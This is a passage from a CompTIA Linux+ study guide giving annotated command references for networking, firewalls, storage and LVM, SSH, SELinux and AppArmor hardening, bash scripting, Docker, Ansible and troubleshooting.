WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now myapp
```

---

## 9. Networking

```bash
# View network configuration
ip addr show                    # All interfaces and IPs
ip addr show eth0               # Specific interface
ip link show                    # Link-layer info
ip route show                   # Routing table
ip neigh show                   # ARP/neighbor table
ss -tulnp                       # Listening ports and processes
ss -an                          # All connections
netstat -tulnp                  # Older alternative
netstat -an

# Configure network (temporary)
ip addr add 192.168.1.100/24 dev eth0
ip addr del 192.168.1.100/24 dev eth0
ip link set eth0 up
ip link set eth0 down
ip route add default via 192.168.1.1
ip route add 10.0.0.0/8 via 192.168.1.254

# Persistent network config
# Ubuntu/Netplan (/etc/netplan/*.yaml)
# RHEL (/etc/sysconfig/network-scripts/ifcfg-eth0)
# Systemd-networkd (/etc/systemd/network/*.network)

# DNS
cat /etc/resolv.conf            # DNS servers
cat /etc/hosts                  # Static hostname resolution
resolvectl status               # systemd-resolved info
dig example.com                 # DNS query
dig example.com MX
dig +short example.com
nslookup example.com
host example.com

# Network testing
ping -c 4 8.8.8.8               # ICMP echo (4 packets)
ping6 ::1                       # IPv6 ping
traceroute example.com          # Trace path
tracepath example.com           # No root required
mtr example.com                 # Interactive traceroute
curl -v http://example.com      # HTTP request
wget http://example.com/file
nc -zv 10.0.0.1 22              # Test TCP port
nc -zvu 10.0.0.1 53             # Test UDP port
tcpdump -i eth0                 # Capture packets
tcpdump -i eth0 port 80
tcpdump -w capture.pcap

# Firewall
# iptables
iptables -L                     # List all rules
iptables -L -n -v               # With numbers and packet counts
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -j DROP       # Default deny
iptables -D INPUT 3             # Delete rule 3
iptables -I INPUT 1 -j ACCEPT  # Insert at position 1
iptables -F                     # Flush (delete all rules)
iptables-save > rules.v4        # Save rules
iptables-restore < rules.v4    # Restore rules

# nftables (modern replacement)
nft list ruleset
nft add rule inet filter input tcp dport 22 accept

# firewalld (RHEL/Fedora)
firewall-cmd --state
firewall-cmd --list-all
firewall-cmd --add-service=http --permanent
firewall-cmd --add-port=8080/tcp --permanent
firewall-cmd --reload
firewall-cmd --zone=public --add-service=https

# ufw (Ubuntu Uncomplicated Firewall)
ufw status
ufw enable
ufw allow ssh
ufw allow 80/tcp
ufw deny 23
ufw delete allow 80/tcp
```

---

## 10. Storage and File Systems

```bash
# View storage
df -h                           # Disk usage by filesystem
du -sh /home/*                  # Directory sizes
du -sh /var/log
lsblk                           # Block devices tree
blkid                           # UUIDs and types
fdisk -l                        # List partitions (legacy MBR)
gdisk -l /dev/sda               # List partitions (GPT)
parted -l                       # parted's view

# Partitioning
fdisk /dev/sdb                  # Interactive MBR partitioning
gdisk /dev/sdb                  # Interactive GPT partitioning
parted /dev/sdb                 # GNU parted

# Create filesystem
mkfs.ext4 /dev/sdb1             # Format as ext4
mkfs.xfs /dev/sdb1              # Format as XFS
mkfs.vfat /dev/sdb1             # Format as FAT32
mkswap /dev/sdb2                # Create swap

# Mount/unmount
mount /dev/sdb1 /mnt/data       # Mount device
mount -t ext4 /dev/sdb1 /mnt   # Specify filesystem type
mount -o ro /dev/sdb1 /mnt      # Read-only mount
mount -o remount,rw /mnt        # Remount as read-write
umount /mnt                     # Unmount
umount -l /mnt                  # Lazy unmount
findmnt                         # Show mount tree

# /etc/fstab (persistent mounts)
# Device   Mountpoint  FStype   Options          Dump  Pass
UUID=xxx   /mnt/data   ext4    defaults          0     2
/dev/sdb1  /mnt/data   xfs     defaults          0     0
tmpfs      /tmp        tmpfs   defaults,size=1G  0     0

mount -a                        # Mount everything in fstab

# LVM (Logical Volume Manager)
# Physical volumes → Volume group → Logical volumes

# Create PV, VG, LV
pvcreate /dev/sdb /dev/sdc      # Initialize physical volumes
vgcreate myvg /dev/sdb /dev/sdc # Create volume group
lvcreate -L 10G -n mylv myvg   # Create 10GB logical volume
lvcreate -l 100%FREE -n mylv myvg  # Use all free space
mkfs.ext4 /dev/myvg/mylv       # Format

# Resize LVM
lvextend -L +5G /dev/myvg/mylv  # Extend by 5GB
lvextend -l +100%FREE /dev/myvg/mylv  # Use all free space
resize2fs /dev/myvg/mylv        # Resize ext4 filesystem
xfs_growfs /mnt/mountpoint      # Resize XFS filesystem

# LVM info
pvdisplay                       # Physical volume info
vgdisplay                       # Volume group info
lvdisplay                       # Logical volume info
pvs; vgs; lvs                  # Quick summary

# Snapshots
lvcreate -L 1G -s -n snap /dev/myvg/mylv  # Create snapshot

# RAID with mdadm
mdadm --create /dev/md0 --level=1 --raid-devices=2 /dev/sdb /dev/sdc
mdadm --detail /dev/md0
cat /proc/mdstat
```

---

## 11. SSH and Remote Access

```bash
# Connect
ssh alice@server.example.com
ssh -p 2222 alice@server.example.com   # Non-default port
ssh -i ~/.ssh/mykey alice@server.example.com  # Specific key
ssh -X alice@server.example.com        # X11 forwarding (GUI apps)
ssh -L 8080:localhost:80 alice@server  # Local port forwarding
ssh -R 9090:localhost:3000 alice@server # Remote port forwarding

# Key management
ssh-keygen -t ed25519 -C "alice@example.com"   # Generate key pair
ssh-keygen -t rsa -b 4096                       # RSA 4096-bit
ssh-copy-id alice@server                        # Copy public key to server
cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys  # Manual

# SSH config file (~/.ssh/config)
Host myserver
    HostName server.example.com
    User alice
    Port 2222
    IdentityFile ~/.ssh/mykey
    ServerAliveInterval 60

ssh myserver                    # Now just use alias

# Server config (/etc/ssh/sshd_config)
Port 22
PermitRootLogin no              # Disable root SSH
PasswordAuthentication no       # Keys only
PubkeyAuthentication yes
AllowUsers alice bob            # Whitelist users
MaxAuthTries 3
ClientAliveInterval 300
Banner /etc/ssh/banner

systemctl restart sshd          # Apply config changes

# SCP and SFTP
scp file.txt alice@server:/home/alice/
scp alice@server:/file.txt ./
scp -r directory/ alice@server:/tmp/
sftp alice@server

# Tunneling
ssh -D 1080 alice@server        # Dynamic SOCKS proxy
ssh -N -L 5432:dbserver:5432 alice@jumphost  # Tunnel DB port
```

---

## 12. Security Hardening

```bash
# SELinux (Security-Enhanced Linux) — RHEL/CentOS
getenforce                      # Enforcing / Permissive / Disabled
setenforce 0                    # Set Permissive (temporary)
setenforce 1                    # Set Enforcing (temporary)
# Permanent: SELINUX=enforcing in /etc/selinux/config

sestatus                        # Full SELinux status
ls -Z file.txt                  # View SELinux context
ps auxZ | grep nginx            # Process context
chcon -t httpd_sys_content_t /var/www/html  # Change context
restorecon -Rv /var/www/html    # Restore default context
semanage fcontext -a -t httpd_sys_content_t '/data/web(/.*)?' # Permanent
semanage port -l | grep http    # See allowed ports for HTTP
semanage port -a -t http_port_t -p tcp 8080  # Allow port 8080
getsebool -a | grep httpd       # SELinux booleans
setsebool -P httpd_can_network_connect on  # Set boolean permanently
ausearch -c nginx               # Search audit log for nginx

# AppArmor (Ubuntu/Debian alternative to SELinux)
aa-status                       # AppArmor status
aa-enforce /etc/apparmor.d/usr.sbin.nginx   # Enforce profile
aa-complain /etc/apparmor.d/usr.sbin.nginx  # Complain mode
aa-disable /etc/apparmor.d/usr.sbin.nginx   # Disable profile
apparmor_parser -r /etc/apparmor.d/nginx    # Reload profile

# Auditd — Linux Audit System
auditctl -l                     # List rules
auditctl -w /etc/passwd -p wa   # Watch file for writes/attribs
auditctl -a always,exit -F arch=b64 -S execve  # Log all exec calls
ausearch -f /etc/passwd         # Search audit log for file
ausearch -ua alice              # All audit events for alice
ausearch -ts today              # Today's events
aureport --failed               # Failed events report

# Fail2Ban — block IPs after repeated failures
systemctl status fail2ban
fail2ban-client status          # List jails
fail2ban-client status sshd     # SSH jail status
fail2ban-client set sshd banip 1.2.3.4  # Manually ban IP
fail2ban-client set sshd unbanip 1.2.3.4  # Unban IP

# Security scanning
lynis audit system              # System security audit
rkhunter --check                # Rootkit hunter
chkrootkit                      # Another rootkit checker
aide --check                    # File integrity check
aide --init                     # Initialize AIDE database
```

---

## 13. Bash Scripting

```bash
#!/bin/bash
# Shebang line — tells system which interpreter to use

# Variables
NAME="Alice"
AGE=25
echo "Hello, $NAME! You are $AGE years old."

# Command substitution
DATE=$(date +%Y-%m-%d)
UPTIME=`uptime -p`             # Old syntax

# Arithmetic
RESULT=$((5 + 3 * 2))
let "COUNT += 1"
COUNT=$((COUNT + 1))

# Read input
read -p "Enter your name: " USERNAME
read -sp "Enter password: " PASSWORD    # Silent (for passwords)

# Conditionals
if [ "$NAME" = "Alice" ]; then
    echo "Welcome, Alice!"
elif [ "$AGE" -gt 18 ]; then
    echo "You are an adult"
else
    echo "Hello, stranger"
fi

# Test operators
# String: = != < > -z (empty) -n (non-empty)
# Numeric: -eq -ne -lt -le -gt -ge
# Files: -f (file) -d (dir) -e (exists) -r (readable) -w (writable) -x (executable) -s (non-empty)

# [[ ]] (bash extended — preferred)
if [[ "$NAME" == "Alice" && "$AGE" -gt 18 ]]; then
    echo "Adult Alice"
fi
if [[ "$NAME" =~ ^A ]]; then   # Regex match
    echo "Name starts with A"
fi

# Case statement
case "$1" in
    start)   echo "Starting..." ;;
    stop)    echo "Stopping..." ;;
    restart) echo "Restarting..." ;;
    *)       echo "Usage: $0 {start|stop|restart}" ;;
esac

# Loops
for i in 1 2 3 4 5; do
    echo "Number: $i"
done

for i in $(seq 1 10); do echo $i; done
for i in {1..10}; do echo $i; done
for i in {0..20..2}; do echo $i; done  # Step by 2

for file in /etc/*.conf; do
    echo "Config: $file"
done

while [ $COUNT -lt 10 ]; do
    COUNT=$((COUNT + 1))
done

until [ $COUNT -ge 10 ]; do
    COUNT=$((COUNT + 1))
done

# Functions
function greet() {
    local NAME="$1"             # Local variable
    echo "Hello, $NAME!"
    return 0                    # Return code (0=success)
}
greet "Alice"
echo "Exit code: $?"

# Arrays
FRUITS=("apple" "banana" "cherry")
echo "${FRUITS[0]}"             # apple
echo "${FRUITS[@]}"             # All elements
echo "${#FRUITS[@]}"            # Count
FRUITS+=("date")                # Append
for fruit in "${FRUITS[@]}"; do
    echo "$fruit"
done

# Associative arrays (bash 4+)
declare -A AGES
AGES["alice"]=25
AGES["bob"]=30
echo "${AGES["alice"]}"
for key in "${!AGES[@]}"; do
    echo "$key: ${AGES[$key]}"
done

# Special variables
$0      # Script name
$1-$9   # Positional arguments
$#      # Number of arguments
$@      # All arguments (as separate words)
$*      # All arguments (as one string)
$$      # Current PID
$!      # Last background PID
$?      # Last exit code

# Error handling
set -e                          # Exit on error
set -u                          # Exit on undefined variable
set -o pipefail                 # Catch pipe failures
set -x                          # Debug mode (print commands)
set -euo pipefail               # Best practice combination

trap 'echo "Error on line $LINENO"' ERR
trap 'cleanup' EXIT             # Always run cleanup on exit

# String operations
STR="Hello, World!"
echo "${#STR}"                  # Length: 13
echo "${STR:7:5}"               # Substring: World
echo "${STR,,}"                 # Lowercase
echo "${STR^^}"                 # Uppercase
echo "${STR/World/Linux}"       # Replace first
echo "${STR//l/L}"              # Replace all
echo "${STR#Hello, }"           # Remove prefix
echo "${STR%!}"                 # Remove suffix
FILE="/path/to/script.sh"
echo "${FILE##*/}"              # Basename: script.sh
echo "${FILE%/*}"               # Dirname: /path/to
echo "${FILE%.sh}"              # Remove extension: /path/to/script
```

---

## 14. Containers and Automation

### Docker Basics

```bash
# Images
docker pull ubuntu:22.04        # Pull from registry
docker images                   # List local images
docker rmi ubuntu:22.04         # Remove image
docker build -t myapp:1.0 .     # Build from Dockerfile

# Containers
docker run ubuntu:22.04         # Run (exit immediately)
docker run -it ubuntu:22.04 bash  # Interactive terminal
docker run -d nginx             # Detached (background)
docker run -d -p 8080:80 nginx  # Port mapping host:container
docker run -d -v /data:/data nginx  # Volume mount
docker run --name mycontainer nginx  # Named container
docker run --env KEY=value nginx    # Environment variable
docker run --rm nginx           # Remove on exit

docker ps                       # Running containers
docker ps -a                    # All containers (including stopped)
docker start container_name
docker stop container_name
docker restart container_name
docker rm container_name        # Remove stopped container
docker rm -f container_name     # Force remove running container

docker exec -it mycontainer bash    # Shell in running container
docker logs mycontainer             # View logs
docker logs -f mycontainer          # Follow logs
docker inspect mycontainer          # Detailed info
docker stats                        # Real-time resource usage
docker cp file.txt container:/tmp/  # Copy to container

# Dockerfile
# FROM ubuntu:22.04
# LABEL maintainer="alice@example.com"
# ENV APP_PORT=8080
# RUN apt-get update && apt-get install -y python3
# WORKDIR /app
# COPY requirements.txt .
# RUN pip3 install -r requirements.txt
# COPY . .
# EXPOSE 8080
# CMD ["python3", "app.py"]

# Networks
docker network ls
docker network create mynet
docker run -d --network mynet --name db postgres
docker run -d --network mynet --name app myapp

# Volumes (persistent storage)
docker volume create mydata
docker run -d -v mydata:/data nginx
docker volume ls
docker volume inspect mydata
```

### Ansible Basics

```yaml
# Inventory file (hosts.ini)
[webservers]
web1.example.com
web2.example.com

[databases]
db1.example.com ansible_user=admin ansible_ssh_private_key_file=~/.ssh/key

# Playbook (deploy.yml)
---
- name: Configure web servers
  hosts: webservers
  become: yes                   # Use sudo

  vars:
    app_port: 8080
    app_dir: /opt/myapp

  tasks:
    - name: Update apt cache
      apt:
        update_cache: yes

    - name: Install nginx
      package:
        name: nginx
        state: present

    - name: Copy config
      template:
        src: nginx.conf.j2
        dest: /etc/nginx/nginx.conf
      notify: restart nginx

    - name: Ensure nginx is running
      service:
        name: nginx
        state: started
        enabled: yes

  handlers:
    - name: restart nginx
      service:
        name: nginx
        state: restarted
```

```bash
# Ansible commands
ansible all -i hosts.ini -m ping                # Test connectivity
ansible webservers -i hosts.ini -m shell -a "uptime"  # Run command
ansible-playbook deploy.yml -i hosts.ini        # Run playbook
ansible-playbook deploy.yml --check             # Dry run
ansible-playbook deploy.yml -v                  # Verbose
ansible-vault encrypt secrets.yml              # Encrypt file
ansible-vault edit secrets.yml
```

---

## 15. Linux+ Troubleshooting Commands

```bash
# System info
uname -a                        # Kernel version and arch
hostnamectl                     # Hostname and OS info
lscpu                           # CPU info
lsmem                           # Memory info
lsblk                           # Block devices
lspci                           # PCI devices
lsusb                           # USB devices
dmidecode                       # Hardware info from BIOS

# Performance
top, htop                       # Real-time processes
uptime                          # Load averages
vmstat 1 5                      # Virtual memory stats
iostat -x 1                     # I/O stats
sar -u 1 5                      # CPU usage over time
free -h                         # Memory usage

# Boot process
dmesg                           # Kernel ring buffer (boot messages)
dmesg | grep -i error
journalctl -b                   # This boot's logs
journalctl -b -1                # Previous boot
systemctl list-units --failed   # Failed services

# Log files
/var/log/syslog                 # General system log (Debian)
/var/log/messages               # General system log (RHEL)
/var/log/auth.log               # Authentication log (Debian)
/var/log/secure                 # Authentication log (RHEL)
/var/log/kern.log               # Kernel log
/var/log/dmesg                  # Boot messages
/var/log/nginx/access.log       # Nginx access
/var/log/nginx/error.log        # Nginx errors
/var/log/mysql/error.log        # MySQL errors
```

---

## 16. Linux+ Quick Reference

**File permissions:** rwx rwx rwx = owner group others; r=4 w=2 x=1  
**SUID:** Executes as file owner | **SGID:** Executes as file group | **Sticky:** Only owner deletes  
**Find SUID:** `find / -perm -4000`  
**Package managers:** apt/dpkg (Debian) | dnf/rpm (RHEL)  
**Process signals:** 1=SIGHUP 2=SIGINT 9=SIGKILL 15=SIGTERM  
**Systemd:** `systemctl start|stop|restart|enable|disable|status service`  
**Journal:** `journalctl -u service -f`  
**LVM:** PV → VG → LV  
**SELinux:** Enforcing > Permissive > Disabled; `getenforce` / `setenforce`  
**SSH keys:** `ssh-keygen` → `ssh-copy-id` → connect  
**Bash special vars:** `$0`=script `$1-9`=args `$#`=count `$?`=exit code `$$`=PID  
**Networking:** `ip addr` / `ip route` / `ss -tulnp`  
**Redirection:** `>` overwrite | `>>` append | `2>` stderr | `|` pipe

---

*End of CompTIA Linux+ Study Guide*


---

